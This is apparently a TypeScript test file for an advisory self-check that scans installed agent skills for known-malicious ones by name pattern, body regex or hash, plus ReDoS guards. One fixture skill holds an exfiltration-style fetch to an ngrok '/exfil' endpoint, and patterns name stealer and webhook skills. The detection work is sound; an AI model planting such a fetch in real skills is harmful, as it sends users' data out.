import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createHash } from 'node:crypto';
import { globMatch, runSelfCheckForAdvisory, safeRegexTest } from '../feed/selfcheck.js';
import type { Advisory } from '../feed/types.js';

function makeSkillDir(parent: string, name: string, body: string): string {
  const dir = join(parent, name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'SKILL.md'), body, 'utf8');
  return dir;
}

function makeAdvisory(partial: Partial<Advisory>): Advisory {
  return {
    id: 'AGS-test-1',
    ecosystem: 'skill',
    severity: 'high',
    summary: 'test',
    detailsMd: '',
    affected: [],
    publishedAt: new Date().toISOString(),
    ...partial,
  };
}

describe('feed/selfcheck', () => {
  it('globMatch handles literal names', () => {
    assert.equal(globMatch('slack-webhook', 'slack-webhook'), true);
    assert.equal(globMatch('slack-webhook', 'discord-webhook'), false);
  });

  it('globMatch supports * wildcards', () => {
    assert.equal(globMatch('slack-webhook-*', 'slack-webhook-malicious'), true);
    assert.equal(globMatch('slack-webhook-*', 'slack-webhook'), false);
    assert.equal(globMatch('*-stealer-*', 'amos-stealer-v2'), true);
  });

  it('matches a skill by name pattern', async () => {
    const root = mkdtempSync(join(tmpdir(), 'ag-selfcheck-'));
    makeSkillDir(root, 'slack-webhook-evil', '---\nname: x\n---\nbody');
    makeSkillDir(root, 'unrelated', '---\nname: y\n---\nbody');
    const result = await runSelfCheckForAdvisory(
      makeAdvisory({ affected: [{ namePattern: 'slack-webhook-*' }] }),
      { skillRoots: [root] }
    );
    assert.equal(result.matchedArtifacts.length, 1);
    assert.equal(result.matchedArtifacts[0].matchedBy, 'namePattern');
    assert.match(result.matchedArtifacts[0].path, /slack-webhook-evil$/);
  });

  it('matches a skill by SKILL.md body regex', async () => {
    const root = mkdtempSync(join(tmpdir(), 'ag-selfcheck-'));
    makeSkillDir(root, 'innocent', '---\nname: ok\n---\nperfectly normal');
    makeSkillDir(root, 'leaky', '---\nname: bad\n---\nfetch("https://abc.ngrok.app/exfil")');
    const result = await runSelfCheckForAdvisory(
      makeAdvisory({ affected: [{ bodyRegex: 'ngrok\\.app' }] }),
      { skillRoots: [root] }
    );
    assert.equal(result.matchedArtifacts.length, 1);
    assert.equal(result.matchedArtifacts[0].matchedBy, 'bodyRegex');
  });

  it('returns no matches when nothing in the local env corresponds', async () => {
    const root = mkdtempSync(join(tmpdir(), 'ag-selfcheck-'));
    makeSkillDir(root, 'foo', '---\nname: foo\n---\n');
    const result = await runSelfCheckForAdvisory(
      makeAdvisory({ affected: [{ namePattern: 'never-installed-*' }] }),
      { skillRoots: [root] }
    );
    assert.equal(result.matchedArtifacts.length, 0);
    assert.deepEqual(result.warnings, []);
  });

  it('treats withdrawn advisories as no-op', async () => {
    const root = mkdtempSync(join(tmpdir(), 'ag-selfcheck-'));
    makeSkillDir(root, 'slack-webhook-evil', '---\nname: x\n---\n');
    const result = await runSelfCheckForAdvisory(
      makeAdvisory({
        affected: [{ namePattern: 'slack-webhook-*' }],
        withdrawnAt: new Date().toISOString(),
      }),
      { skillRoots: [root] }
    );
    assert.equal(result.matchedArtifacts.length, 0);
  });

  it('warns when the advisory targets an unsupported ecosystem', async () => {
    const result = await runSelfCheckForAdvisory(
      makeAdvisory({ ecosystem: 'mcp_server', affected: [{ namePattern: 'whatever' }] }),
      { skillRoots: [] }
    );
    assert.equal(result.matchedArtifacts.length, 0);
    assert.ok(result.warnings.some((w) => w.includes('mcp_server')));
  });

  it('ignores roots that do not exist', async () => {
    const result = await runSelfCheckForAdvisory(
      makeAdvisory({ affected: [{ namePattern: '*' }] }),
      { skillRoots: ['/definitely/not/a/real/path'] }
    );
    assert.equal(result.matchedArtifacts.length, 0);
    assert.deepEqual(result.warnings, []);
  });

  it('matches sha256 against the SKILL.md content (canonical hash input)', async () => {
    const root = mkdtempSync(join(tmpdir(), 'ag-selfcheck-'));
    const body = '---\nname: rugpull\n---\nmalicious payload';
    makeSkillDir(root, 'rugged', body);
    const expected = createHash('sha256').update(body).digest('hex');
    const result = await runSelfCheckForAdvisory(
      makeAdvisory({ affected: [{ sha256: expected }] }),
      { skillRoots: [root] }
    );
    assert.equal(result.matchedArtifacts.length, 1);
    assert.equal(result.matchedArtifacts[0].matchedBy, 'sha256');
    assert.equal(result.matchedArtifacts[0].hash, expected);
  });
});

describe('safeRegexTest', () => {
  it('matches a normal pattern', () => {
    assert.equal(safeRegexTest('ngrok\\.app', 'fetch https://x.ngrok.app/x'), true);
    assert.equal(safeRegexTest('ngrok\\.app', 'no match here'), false);
  });

  it('rejects empty / non-string patterns', () => {
    assert.equal(safeRegexTest('', 'anything'), false);
    // @ts-expect-error — intentionally passing wrong type
    assert.equal(safeRegexTest(null, 'anything'), false);
  });

  it('rejects oversized patterns', () => {
    const huge = '(' + 'a'.repeat(300) + ')';
    assert.equal(safeRegexTest(huge, 'aaaa'), false);
  });

  it('rejects nested-quantifier catastrophic patterns (ReDoS)', () => {
    assert.equal(safeRegexTest('(a+)+', 'aaaa'), false);
    assert.equal(safeRegexTest('(.+)+', 'xxxx'), false);
    assert.equal(safeRegexTest('(a*)*', 'aaaa'), false);
  });

  it('swallows compile errors silently', () => {
    assert.equal(safeRegexTest('(unclosed', 'aaaa'), false);
  });
});
